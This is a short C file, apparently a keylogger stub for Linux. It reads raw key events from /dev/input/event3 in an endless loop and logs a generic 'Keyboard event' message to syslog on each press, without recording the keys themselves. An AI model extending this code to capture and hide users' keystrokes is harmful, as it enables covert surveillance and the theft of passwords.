#include <linux/input.h>
#include <unistd.h>
#include <fcntl.h>

static int user_keyboard;

void keylogger_exit(void) {
    close(user_keyboard);
}

void keylogger(){
  struct input_event key_event;
  user_keyboard = open("/dev/input/event3", O_RDONLY);

  while(1) {

    read(user_keyboard, &key_event, sizeof(key_event));
    if ((key_event.type == EV_KEY) && (key_event.value == 1)){
      syslog(LOG_NOTICE, "Keyboard event");
    }
  }

}
